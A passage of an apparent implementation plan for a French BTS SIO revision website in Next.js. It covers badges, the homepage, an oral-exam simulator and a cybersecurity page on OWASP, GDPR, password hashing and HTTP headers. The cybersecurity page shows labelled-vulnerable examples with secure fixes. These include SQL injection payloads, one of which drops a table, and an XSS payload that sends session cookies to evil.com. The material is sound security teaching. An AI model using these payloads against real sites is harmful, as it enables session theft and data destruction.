  { id: "defenseur-rgpd",   label: "Défenseur RGPD",     icon: "📋", desc: "Score >85% au QCM RGPD",                locked: true  },
];

export default function BadgesSection() {
  return (
    <section className="max-w-7xl mx-auto px-4 py-12">
      <h2 className="font-heading font-bold text-2xl text-foreground mb-2">
        Badges & Gamification
      </h2>
      <p className="text-muted font-body text-sm mb-8">
        Débloque des badges en complétant les modules et en maintenant ta série de révision.
      </p>
      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
        {badges.map((b) => (
          <div
            key={b.id}
            className={`rounded-xl border p-4 flex flex-col items-center text-center gap-2 transition-all
              ${b.locked
                ? "border-border bg-surface opacity-50 grayscale"
                : "border-sisr-primary/50 bg-sisr-primary/10 shadow-[0_0_12px_rgba(34,197,94,0.2)]"
              }`}
          >
            <span className="text-3xl">{b.icon}</span>
            <p className={`font-heading font-bold text-sm ${b.locked ? "text-muted" : "text-sisr-primary"}`}>
              {b.label}
            </p>
            <p className="text-xs text-muted font-body leading-relaxed">{b.desc}</p>
            {b.locked && (
              <span className="text-xs text-muted/60 font-code">🔒 Verrouillé</span>
            )}
          </div>
        ))}
      </div>
    </section>
  );
}
```

- [ ] **Step 4: Commit**

```bash
git add .
git commit -m "feat: add BentoGrid, ModuleCard and BadgesSection"
```

---

## Task 7: Homepage Assembly

**Files:**
- Modify: `app/page.tsx`

- [ ] **Step 1: Assemble homepage**

Replace `app/page.tsx`:

```tsx
import Hero from "@/components/Hero";
import BentoGrid from "@/components/BentoGrid";
import BadgesSection from "@/components/BadgesSection";
import { BookOpen, Shield, GraduationCap } from "lucide-react";
import Link from "next/link";

const examens = [
  {
    code: "E4",
    title: "Support & mise à disposition",
    desc: "Dossier professionnel, générateur de fiches d'activités, simulateur de jury.",
    href: "/examens/e4",
    icon: BookOpen,
  },
  {
    code: "E5",
    title: "Conception / Administration",
    desc: "Fiches techniques SISR & SLAM, annales officielles, QCM ciblés.",
    href: "/examens/e5",
    icon: GraduationCap,
  },
  {
    code: "E6",
    title: "Cybersécurité & Portfolio",
    desc: "Simulateur d'oral, portfolio builder, questions jury fréquentes.",
    href: "/examens/e6",
    icon: Shield,
  },
];

export default function HomePage() {
  return (
    <>
      <Hero />
      <BentoGrid />

      {/* Zone Examens */}
      <section className="max-w-7xl mx-auto px-4 py-12 border-t border-border">
        <h2 className="font-heading font-bold text-2xl text-foreground mb-2">
          Zone Examens
        </h2>
        <p className="text-muted font-body text-sm mb-8">
          Prépare tes épreuves finales avec des outils dédiés.
        </p>
        <div className="grid sm:grid-cols-3 gap-4">
          {examens.map((e) => (
            <Link
              key={e.code}
              href={e.href}
              className="group rounded-xl border border-border bg-surface p-6 hover:border-slam-primary/50 hover:bg-slam-primary/5 transition-all"
            >
              <div className="flex items-center gap-3 mb-3">
                <div className="w-10 h-10 rounded-lg bg-slam-primary/20 flex items-center justify-center">
                  <e.icon className="w-5 h-5 text-slam-primary" />
                </div>
                <p className="font-heading font-bold text-slam-primary text-lg">Épreuve {e.code}</p>
              </div>
              <p className="font-heading font-semibold text-sm text-foreground mb-2">{e.title}</p>
              <p className="text-xs text-muted font-body leading-relaxed">{e.desc}</p>
            </Link>
          ))}
        </div>
      </section>

      <BadgesSection />
    </>
  );
}
```

- [ ] **Step 2: Run dev server and check**

```bash
cd /Users/sdjbrl/projects/btssio-dev
npm run dev
```

Open http://localhost:3000 — should see hero, bento grid, examens, badges.

- [ ] **Step 3: Commit**

```bash
git add .
git commit -m "feat: assemble homepage with all sections"
```

---

## Task 8: Bloc 3 SLAM — Cybersécurité Page

**Files:**
- Create: `app/bloc3/slam/page.tsx`, `components/OralSimulator.tsx`

- [ ] **Step 1: Create OralSimulator component**

Create `components/OralSimulator.tsx`:

```tsx
"use client";
import { useState } from "react";
import { ChevronDown, ChevronUp, Mic } from "lucide-react";

const questions = [
  {
    q: "Dans votre projet, comment avez-vous protégé l'application contre les injections SQL ?",
    a: "Évoquer : PDO + requêtes préparées avec bindParam(), validation et assainissement des entrées (filter_input), principe du moindre privilège sur le compte BDD (droits SELECT/INSERT/UPDATE/DELETE uniquement sur les tables concernées), utilisation d'un ORM si applicable.",
  },
  {
    q: "Qu'aurait-il pu se passer si vous n'aviez pas sécurisé ce formulaire contre le XSS ?",
    a: "Évoquer : Vol de cookies de session (document.cookie), défacement de la page, redirection vers un site de phishing, propagation d'un ver XSS dans une communauté, impact RGPD (violation de données personnelles à notifier à la CNIL sous 72h).",
  },
  {
    q: "Votre application collecte des adresses e-mail. Quelles obligations RGPD s'appliquent ?",
    a: "Évoquer : Base légale du traitement (consentement libre, éclairé, spécifique, univoque), durée de conservation limitée, droit d'accès et d'effacement des utilisateurs, sécurisation des données (hachage, chiffrement, accès restreints), registre des activités de traitement.",
  },
  {
    q: "Expliquez la différence entre authentification et autorisation.",
    a: "Authentification = prouver son identité (qui es-tu ? → login/mot de passe, MFA). Autorisation = droits accordés après identification (qu'as-tu le droit de faire ? → RBAC, ACL). Exemple concret : se connecter (authn) puis accéder à /admin (authz — vérifié côté serveur).",
  },
  {
    q: "Comment fonctionne une attaque CSRF et comment l'éviter ?",
    a: "Scénario : victime connectée sur site A, visite site B malveillant qui forge une requête vers site A → le navigateur envoie automatiquement le cookie de session → action exécutée à l'insu de la victime. Contre-mesures : jeton CSRF unique par formulaire (Synchronizer Token Pattern), SameSite=Strict sur les cookies, vérification du header Referer/Origin.",
  },
  {
    q: "Qu'est-ce que le Privacy by Design ? L'avez-vous appliqué dans votre projet ?",
    a: "Privacy by Design (Art. 25 RGPD) = intégrer la protection des données dès la conception, pas après. 7 principes fondateurs : proactif, confidentialité par défaut, intégré dans la conception, fonctionnel, sécurité bout-en-bout, visibilité, respect de la vie privée. Exemple concret : ne collecter que le nom + email (minimisation), hasher les mots de passe dès l'implémentation.",
  },
];

export default function OralSimulator() {
  const [open, setOpen] = useState<number | null>(null);

  return (
    <div className="flex flex-col gap-3">
      {questions.map((item, i) => (
        <div key={i} className="rounded-lg border border-border bg-surface overflow-hidden">
          <button
            className="w-full flex items-center justify-between gap-4 px-5 py-4 text-left hover:bg-surface-2 transition-colors"
            onClick={() => setOpen(open === i ? null : i)}
            aria-expanded={open === i}
          >
            <div className="flex items-start gap-3">
              <Mic size={16} className="text-slam-primary mt-0.5 shrink-0" />
              <span className="text-sm font-body font-medium text-foreground leading-relaxed">
                {item.q}
              </span>
            </div>
            {open === i ? (
              <ChevronUp size={16} className="text-muted shrink-0" />
            ) : (
              <ChevronDown size={16} className="text-muted shrink-0" />
            )}
          </button>
          {open === i && (
            <div className="px-5 pb-4 border-t border-border">
              <p className="text-sm text-muted font-body leading-relaxed pt-4">
                <span className="text-slam-primary font-semibold">Éléments de réponse : </span>
                {item.a}
              </p>
            </div>
          )}
        </div>
      ))}
    </div>
  );
}
```

- [ ] **Step 2: Build Bloc 3 SLAM full page**

Create `app/bloc3/slam/page.tsx`:

```tsx
import { Shield, AlertTriangle, Lock, Database, Code2, FileText, Mic, ChevronRight } from "lucide-react";
import RevisionSection from "@/components/RevisionSection";
import CodeBlock from "@/components/CodeBlock";
import CheatSheet from "@/components/CheatSheet";
import QuizCard from "@/components/QuizCard";
import OralSimulator from "@/components/OralSimulator";
import { bloc3SlamQuiz } from "@/lib/quiz-data";
import Link from "next/link";

export const metadata = { title: "Bloc 3 SLAM — Cybersécurité | BTSSIO.DEV" };

const sqlVulnerable = `// ❌ CODE VULNÉRABLE — NE JAMAIS FAIRE
$query = "SELECT * FROM users WHERE login='" . $_POST['login'] . "'";

// Payload d'attaque : ' OR '1'='1
// Requête résultante :
SELECT * FROM users WHERE login='' OR '1'='1'
// → Retourne TOUS les utilisateurs → Auth contournée !

// Payload destructeur : '; DROP TABLE users; --`;

const sqlSecure = `// ✅ SOLUTION — Requêtes préparées (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE login = :login");
$stmt->bindParam(':login', $_POST['login'], PDO::PARAM_STR);
$stmt->execute();
$user = $stmt->fetch();`;

const xssVuln = `<!-- ❌ VULNÉRABLE -->
<p>Bonjour, <?= $_GET['name'] ?></p>
<!-- Payload : <script>document.location='http://evil.com?c='+document.cookie</script>
     → Vol de cookies de session ! -->`;

const xssSafe = `<!-- ✅ SÉCURISÉ -->
<p>Bonjour, <?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?></p>`;

const csrfCode = `// ✅ PROTECTION CSRF — Synchronizer Token Pattern

// 1. Génération du token (côté serveur)
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// 2. Dans le formulaire HTML
echo '<input type="hidden" name="csrf_token"
      value="' . $_SESSION['csrf_token'] . '">';

// 3. Validation à la réception
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    http_response_code(403);
    die('Attaque CSRF détectée !');
}`;

const passwordCode = `// ✅ HACHAGE SÉCURISÉ — PHP password_hash()
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,  // 64 Mo mémoire
    'time_cost'   => 4,      // 4 itérations
    'threads'     => 3,
]);

// ✅ VÉRIFICATION
if (password_verify($inputPassword, $storedHash)) {
    // Authentification réussie
}
// Le sel est automatiquement intégré dans le hash !`;

const headersCode = `# ✅ EN-TÊTES HTTP DE SÉCURITÉ ESSENTIELS

# Forcer HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Politique de contenu (anti-XSS)
Content-Security-Policy: default-src 'self'; script-src 'self'

# Interdire l'affichage en iframe (anti-clickjacking)
X-Frame-Options: DENY

# Bloquer le sniffing MIME
X-Content-Type-Options: nosniff

# Politique de référent
Referrer-Policy: strict-origin-when-cross-origin`;

const accessControlCode = `// ✅ PROTECTION CONTRE L'IDOR
function checkOwnership(PDO $pdo, int $resourceId, int $userId): void {
    $stmt = $pdo->prepare(
        "SELECT id FROM factures WHERE id = :rid AND user_id = :uid"
    );
    $stmt->execute([':rid' => $resourceId, ':uid' => $userId]);
    if (!$stmt->fetch()) {
        http_response_code(403);
        header('Location: /403.html');
        exit;
    }
}

// ✅ RBAC — Vérification côté serveur
function requireRole(string $role): void {
    if (($_SESSION['user_role'] ?? '') !== $role) {
        http_response_code(403);
        header('Location: /403.html');
        exit;
    }
}
requireRole('admin'); // En tête de chaque page sensible`;

export default function Bloc3SlamPage() {
  return (
    <div className="max-w-4xl mx-auto px-4 py-10">
      {/* Header */}
      <div className="mb-10">
        <div className="flex items-center gap-2 text-xs text-muted font-body mb-4">
          <Link href="/" className="hover:text-foreground transition-colors">Accueil</Link>
          <ChevronRight size={12} />
          <Link href="/slam" className="hover:text-foreground transition-colors">SLAM</Link>
          <ChevronRight size={12} />
          <span className="text-cyber-green">Bloc 3 — Cybersécurité</span>
        </div>

        <div className="flex items-start gap-4">
          <div className="p-3 rounded-xl bg-cyber-green/10 border border-cyber-green/30">
            <Shield className="w-8 h-8 text-cyber-green" />
          </div>
          <div>
            <h1 className="font-heading font-bold text-3xl text-foreground">
              Bloc 3 — Cybersécurité des services informatiques
            </h1>
            <p className="text-muted font-body text-sm mt-1">
              Option SLAM · Référentiel EN · Épreuve E6
            </p>
            <div className="flex flex-wrap gap-2 mt-3">
              {["OWASP Top 10", "RGPD", "Injections SQL", "XSS", "CSRF", "Hachage", "Headers HTTP"].map((tag) => (
                <span key={tag} className="text-xs bg-cyber-green/10 text-cyber-green border border-cyber-green/30 px-2 py-0.5 rounded-md font-code">
                  {tag}
                </span>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Compétences */}
      <RevisionSection
        title="Compétences du Bloc 3 — Référentiel officiel"
        subtitle="BO spécial n°5 du 11 avril 2019"
        icon={<FileText size={20} />}
        accent="cyber"
      >
        <div className="overflow-x-auto">
          <table className="w-full text-sm border-collapse">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 pr-4 font-heading text-cyber-green font-semibold text-xs">Code</th>
                <th className="text-left py-2 pr-4 font-heading text-foreground font-semibold text-xs">Compétence</th>
                <th className="text-left py-2 font-heading text-foreground font-semibold text-xs">Niveau</th>
              </tr>
            </thead>
            <tbody className="font-body">
              {[
                ["B3-1", "Protéger les données à caractère personnel", "Maîtrise"],
                ["B3-2", "Préserver l'identité numérique de l'organisation", "Maîtrise"],
                ["B3-3", "Sécuriser les équipements et les usages", "Application"],
                ["B3-4", "Garantir disponibilité, intégrité et confidentialité", "Maîtrise"],
                ["B3-5", "Assurer la cybersécurité d'une solution applicative", "Maîtrise ★"],
              ].map(([code, comp, level]) => (
                <tr key={code} className="border-b border-border/50">
                  <td className="py-2 pr-4 font-code text-cyber-green text-xs">{code}</td>
                  <td className="py-2 pr-4 text-foreground/80 text-xs">{comp}</td>
                  <td className="py-2 text-muted text-xs">{level}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <p className="text-xs text-cyber-green/70 mt-3 font-body">
          ★ Pour SLAM, le cœur de l'épreuve E6 porte sur B3-5 (sécurité applicative) et B3-1 (RGPD).
        </p>
      </RevisionSection>

      {/* RGPD */}
      <RevisionSection
        title="Module 1 — RGPD & Protection des données"
        subtitle="B3-1 · Compétence de maîtrise"
        icon={<FileText size={20} />}
        accent="slam"
      >
        <CheatSheet
          columns={2}
          items={[
            { label: "Entré en vigueur", value: "25 mai 2018", highlight: true },
            { label: "Autorité française", value: "CNIL", highlight: true },
            { label: "Données personnelles", value: "Toute info identifiant directement ou indirectement une personne physique" },
            { label: "Données sensibles", value: "Santé, biométrie, religion, opinions, orientation sexuelle — protection renforcée" },
            { label: "Notification violation", value: "CNIL sous 72h maximum (Art. 33)", highlight: true },
            { label: "Privacy by Design", value: "Art. 25 — Intégrer la protection dès la conception" },
            { label: "Privacy by Default", value: "Paramètres les plus protecteurs par défaut" },
            { label: "Minimisation", value: "Ne collecter que les données strictement nécessaires" },
            { label: "Sanction niveau 1", value: "Jusqu'à 10 M€ ou 2% du CA mondial", danger: true },
            { label: "Sanction niveau 2", value: "Jusqu'à 20 M€ ou 4% du CA mondial", danger: true },
          ]}
        />
        <div className="mt-4">
          <p className="font-heading font-semibold text-sm text-foreground mb-2">6 bases légales de traitement</p>
          <CheatSheet
            items={[
              { label: "Consentement", value: "Libre, éclairé, spécifique, univoque", highlight: true },
              { label: "Exécution d'un contrat" },
              { label: "Obligation légale" },
              { label: "Sauvegarde des intérêts vitaux" },
              { label: "Mission d'intérêt public" },
              { label: "Intérêt légitime du responsable" },
            ]}
          />
        </div>
      </RevisionSection>

      {/* OWASP */}
      <RevisionSection
        title="Module 2 — OWASP Top 10 (édition 2021)"
        subtitle="B3-5 · Failles applicatives — Référence examen"
        icon={<AlertTriangle size={20} />}
        accent="cyber"
      >
        <div className="grid sm:grid-cols-2 gap-2 mb-6">
          {[
            ["#1", "Broken Access Control", "Contrôle d'accès défaillant"],
            ["#2", "Cryptographic Failures", "Échecs cryptographiques"],
            ["#3", "Injection", "SQL, NoSQL, OS, LDAP..."],
            ["#4", "Insecure Design", "Conception non sécurisée"],
            ["#5", "Security Misconfiguration", "Mauvaise configuration"],
            ["#6", "Vulnerable & Outdated Components", "Composants obsolètes"],
            ["#7", "Identification & Authentication Failures", "Authentification défaillante"],
            ["#8", "Software & Data Integrity Failures", "Intégrité logicielle"],
            ["#9", "Security Logging & Monitoring Failures", "Journalisation absente"],
            ["#10", "SSRF", "Server-Side Request Forgery"],
          ].map(([rank, name, desc]) => (
            <div key={rank} className="flex items-start gap-3 rounded-md border border-cyber-green/20 bg-cyber-green/5 px-3 py-2">
              <span className="font-code text-xs text-cyber-green font-bold shrink-0 mt-0.5">{rank}</span>
              <div>
                <p className="text-xs font-heading font-semibold text-foreground">{name}</p>
                <p className="text-xs text-muted font-body">{desc}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Injection SQL */}
        <div className="mb-6">
          <h3 className="font-heading font-bold text-base text-danger mb-3 flex items-center gap-2">
            <AlertTriangle size={16} /> Faille #3 — Injection SQL
          </h3>
          <CodeBlock code={sqlVulnerable} language="php" filename="❌ vulnérable.php" />
          <CodeBlock code={sqlSecure} language="php" filename="✅ sécurisé.php" />
        </div>

        {/* XSS */}
        <div className="mb-6">
          <h3 className="font-heading font-bold text-base text-danger mb-3 flex items-center gap-2">
            <AlertTriangle size={16} /> XSS (Cross-Site Scripting)
          </h3>
          <div className="grid sm:grid-cols-3 gap-3 mb-3 text-xs font-body">
            {[
              { type: "Réfléchi", desc: "Payload dans l'URL, exécuté immédiatement. Phishing via lien piégé." },
              { type: "Persistant", desc: "Payload stocké en BDD. Exécuté à chaque affichage (forum, commentaires)." },
              { type: "DOM-Based", desc: "Manipulation du DOM sans passage par le serveur." },
            ].map((t) => (
              <div key={t.type} className="rounded-md border border-border bg-surface-2 p-3">
                <p className="font-semibold text-foreground mb-1">{t.type}</p>
                <p className="text-muted">{t.desc}</p>
              </div>
            ))}
          </div>
          <CodeBlock code={xssVuln} language="php" filename="❌ xss-vuln.php" />
          <CodeBlock code={xssSafe} language="php" filename="✅ xss-safe.php" />
        </div>

        {/* CSRF */}
        <div className="mb-6">
          <h3 className="font-heading font-bold text-base text-danger mb-3 flex items-center gap-2">
            <AlertTriangle size={16} /> CSRF (Cross-Site Request Forgery)
          </h3>
          <CodeBlock code={csrfCode} language="php" filename="✅ csrf-protection.php" />
        </div>

        {/* Access Control */}
        <div>
          <h3 className="font-heading font-bold text-base text-danger mb-3 flex items-center gap-2">
            <AlertTriangle size={16} /> Broken Access Control (IDOR & RBAC)
          </h3>
          <CodeBlock code={accessControlCode} language="php" filename="✅ access-control.php" />
        </div>
      </RevisionSection>

      {/* Mots de passe */}
      <RevisionSection
        title="Module 3 — Sécurisation des mots de passe & MFA"
        subtitle="B3-5, B3-7"
        icon={<Lock size={20} />}
        accent="slam"
      >
        <CheatSheet
          columns={2}
          items={[
            { label: "MD5 / SHA1", value: "Obsolètes — rainbow tables en secondes", danger: true },
            { label: "SHA256 seul", value: "Vulnérable sans sel — attaques dictionnaire", danger: true },
            { label: "bcrypt", value: "Acceptable — facteur de coût ajustable", highlight: true },
            { label: "Argon2id", value: "Recommandé 2024 — résistant GPU/ASIC", highlight: true },
          ]}
        />
        <CodeBlock code={passwordCode} language="php" filename="✅ password-hash.php" />
        <p className="font-heading font-semibold text-sm text-foreground mb-2 mt-4">Facteurs d'authentification MFA</p>
        <CheatSheet
          items={[
            { label: "Facteur 1 — Ce qu'on SAIT", value: "Mot de passe, PIN, question secrète" },
            { label: "Facteur 2 — Ce qu'on POSSÈDE", value: "OTP/TOTP (RFC 6238), SMS, YubiKey", highlight: true },
            { label: "Facteur 3 — Ce qu'on EST", value: "Biométrie — empreinte, FaceID" },
          ]}
        />
      </RevisionSection>

      {/* Headers HTTP */}
      <RevisionSection
        title="Module 4 — Sécurité des communications (HTTPS & Headers)"
        subtitle="B3-4"
        icon={<Shield size={20} />}
        accent="cyber"
      >
        <CodeBlock code={headersCode} language="http" filename="En-têtes HTTP essentiels" />
      </RevisionSection>

      {/* BDD */}
      <RevisionSection
        title="Module 5 — Sécurité des bases de données"
        subtitle="B3-4, B3-5"
        icon={<Database size={20} />}
        accent="slam"
      >
        <CheatSheet
          columns={2}
          items={[
            { label: "Compte appli web", value: "SELECT, INSERT, UPDATE, DELETE uniquement", highlight: true },
            { label: "Compte admin BDD", value: "Tous droits — JAMAIS utilisé par l'application", danger: true },
            { label: "Chiffrement au repos", value: "AES-256 — clés stockées séparément (vault, .env)" },
            { label: "Règle 3-2-1", value: "3 copies · 2 supports différents · 1 hors site", highlight: true },
            { label: "Secrets dans le code", value: "INTERDIT — utiliser variables d'environnement", danger: true },
            { label: "Tester les sauvegardes", value: "Restauration régulière obligatoire (PRA/PCA)" },
          ]}
        />
      </RevisionSection>

      {/* QCM */}
      <section className="mb-8">
        <div className="flex items-center gap-3 mb-6">
          <Code2 className="w-5 h-5 text-slam-primary" />
          <h2 className="font-heading font-bold text-xl text-foreground">QCM d'auto-évaluation</h2>
          <span className="text-xs bg-slam-primary/20 text-slam-primary px-2 py-0.5 rounded-md font-code">{bloc3SlamQuiz.length} questions</span>
        </div>
        {bloc3SlamQuiz.map((q, i) => (
          <QuizCard key={q.id} question={q} number={i + 1} />
        ))}
      </section>

      {/* Simulateur oral */}
      <section className="mb-8">
        <div className="flex items-center gap-3 mb-6">
          <Mic className="w-5 h-5 text-slam-primary" />
          <h2 className="font-heading font-bold text-xl text-foreground">Simulateur d'oral — Épreuve E6</h2>
        </div>
        <p className="text-muted font-body text-sm mb-4">
          Questions fréquemment posées par les jurys. Clique pour afficher les éléments de réponse.
        </p>
        <OralSimulator />
      </section>
    </div>
  );
}
```

- [ ] **Step 3: Commit**

```bash
git add .
git commit -m "feat: build complete Bloc 3 SLAM cybersecurity revision page"
```

---

## Task 9: SLAM Hub Page

**Files:**
- Create: `app/slam/page.tsx`

- [ ] **Step 1: Create SLAM hub**

Create `app/slam/page.tsx`:

```tsx
import Link from "next/link";
import { Code2, Database, Globe, Smartphone, Shield, ChevronRight } from "lucide-react";

export const metadata = { title: "SLAM — BTS SIO | BTSSIO.DEV" };

const modules = [
  {
    title: "Bloc 1 — Tronc Commun",
    desc: "Support et mise à disposition de services informatiques.",
    icon: Globe,
    href: "/tronc-commun/bloc1",
    topics: ["Gestion des incidents (ITIL)", "Déploiement de postes", "Gestion de parc (GLPI)"],
  },
  {
    title: "POO — Programmation Orientée Objet",
    desc: "PHP, Python, Java — Concepts fondamentaux.",
    icon: Code2,
    href: "/slam/bloc2/poo",
    topics: ["Classes, objets, héritage", "Interfaces et abstractions", "Design Patterns (MVC, Singleton...)"],
  },
  {
    title: "Bases de données & SQL",
    desc: "Conception Merise, SQL avancé, procédures stockées.",
    icon: Database,
    href: "/slam/bloc2/bdd",
    topics: ["MCD → MLD → MPD (Merise)", "Requêtes SQL complexes (JOIN, GROUP BY)", "Transactions et ACID"],
  },
  {
    title: "Architecture MVC & Frameworks",
    desc: "Laravel, Symfony — Développement structuré.",
    icon: Globe,
    href: "/slam/bloc2/mvc",
    topics: ["Pattern MVC", "ORM Eloquent / Doctrine", "Routing, Middleware, Auth"],
  },
  {
    title: "APIs REST & Web Services",
    desc: "Conception et consommation d'APIs sécurisées.",
    icon: Globe,
    href: "/slam/bloc2/api",
    topics: ["RESTful API (stateless, CRUD)", "Authentification JWT / OAuth2", "Formats JSON / XML"],
  },
  {
    title: "Développement Mobile",
    desc: "Applications cross-platform.",
    icon: Smartphone,
    href: "/slam/bloc2/mobile",
    topics: ["React Native", "Cycle de vie des composants", "Navigation, stockage local"],
  },
  {
    title: "Bloc 3 — Cybersécurité",
    desc: "OWASP, RGPD, sécurité applicative — Épreuve E6.",
    icon: Shield,
    href: "/bloc3/slam",
    accent: true,
    topics: ["OWASP Top 10", "RGPD & Privacy by Design", "Injection SQL, XSS, CSRF, IDOR"],
  },
];

export default function SlamPage() {
  return (
    <div className="max-w-7xl mx-auto px-4 py-10">
      <div className="flex items-center gap-3 mb-8">
        <div className="p-3 rounded-xl bg-slam-primary/10 border border-slam-primary/30">
          <Code2 className="w-8 h-8 text-slam-primary" />
        </div>
        <div>
          <h1 className="font-heading font-bold text-3xl text-slam-primary">Option SLAM</h1>
          <p className="text-muted font-body text-sm mt-1">Solutions Logicielles et Applications Métiers</p>
        </div>
      </div>

      <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4">
        {modules.map((m) => (
          <Link
            key={m.title}
            href={m.href}
            className={`group rounded-xl border p-6 flex flex-col gap-3 transition-all
              ${m.accent
                ? "border-cyber-green/30 bg-cyber-green/5 hover:bg-cyber-green/10 hover:border-cyber-green/60"
                : "border-border bg-surface hover:border-slam-primary/40 hover:bg-slam-primary/5"
              }`}
          >
            <div className="flex items-center gap-3">
              <m.icon className={`w-5 h-5 ${m.accent ? "text-cyber-green" : "text-slam-primary"}`} />
              <h2 className={`font-heading font-bold text-sm ${m.accent ? "text-cyber-green" : "text-slam-primary"}`}>
                {m.title}
              </h2>
            </div>
            <p className="text-xs text-muted font-body">{m.desc}</p>
            <ul className="flex flex-col gap-1">
              {m.topics.map((t) => (
                <li key={t} className="text-xs text-muted/80 font-body flex items-start gap-1.5">
                  <span className={`${m.accent ? "text-cyber-green" : "text-slam-primary"} opacity-60 mt-0.5`}>▸</span> {t}
                </li>
              ))}
            </ul>
            <span className={`inline-flex items-center gap-1 text-xs font-semibold mt-auto group-hover:gap-2 transition-all ${m.accent ? "text-cyber-green" : "text-slam-primary"}`}>
              Accéder <ChevronRight size={13} />
            </span>
          </Link>
        ))}
      </div>
    </div>
  );
}
```

- [ ] **Step 2: Commit**

```bash
git add .
git commit -m "feat: add SLAM hub page"
```

---

## Task 10: Final Verification

- [ ] **Step 1: Build production**

```bash
cd /Users/sdjbrl/projects/btssio-dev
npm run build
```

Expected: Build succeeded with no type errors.

- [ ] **Step 2: Verify all pages render**

```bash
npm run dev
```

Check manually:
- http://localhost:3000 → Homepage
- http://localhost:3000/slam → SLAM hub
- http://localhost:3000/bloc3/slam → Cybersec fiche with QCM + code blocks
- http://localhost:3000/examens → (404 acceptable — stub page)

- [ ] **Step 3: Final commit**

```bash
git add .
git commit -m "feat: complete BTSSIO.DEV platform MVP — homepage, SLAM hub, Bloc 3 cyber fiche"
```

---

## Self-Review

### Spec Coverage

| Spec requirement | Task covering it |
|------------------|-----------------|
| Accueil avec tableau de bord | T7 (Hero + BentoGrid + BadgesSection) |
| Sélection option SISR/SLAM | T5 (Hero option cards) |
| Tronc commun (CGE, Anglais, Maths, CEJM) | T6 (BentoGrid) — liens vers stubs |
| Bloc 1 commun | T9 (SLAM hub) |
| Bloc 2 SISR | T6 (BentoGrid card → /sisr/bloc2) |
| Bloc 2 SLAM | T6 + T9 |
| Bloc 3 SLAM complet | T8 (full page) |
| Fiches synthèse cheat sheets | T4 (CheatSheet) + T8 |
| QCM interactifs | T3 (quiz data) + T4 (QuizCard) + T8 |
| Générateur portfolio | Stub (E6 page) — hors MVP |
| Simulateur oral | T8 (OralSimulator) |
| Design dark OLED | T1 (Tailwind tokens + CSS) |
| Accent SISR Bleu/Vert | T1 (design tokens) |
| Accent SLAM Violet/Orange | T1 (design tokens) |
| Typographie Fira Code + Fira Sans | T1 (globals.css) |
| Coloration syntaxique code | T4 (CodeBlock + Prism) |
| Responsive mobile | Tailwind responsive classes throughout |
| Gamification badges | T6 (BadgesSection) + T3 (progress helpers) |
| Zone Examens E4/E5/E6 | T7 (homepage section) |

### Gaps (Post-MVP)

- SISR hub page (similar to SLAM — low priority, same pattern)
- `/examens` dedicated page
- Progress persistence UI (ProgressDashboard component exists in spec but not wired to a page)
- Auth/login system (requires backend — out of scope for MVP)
- Individual module pages (Bloc 2 content pages)
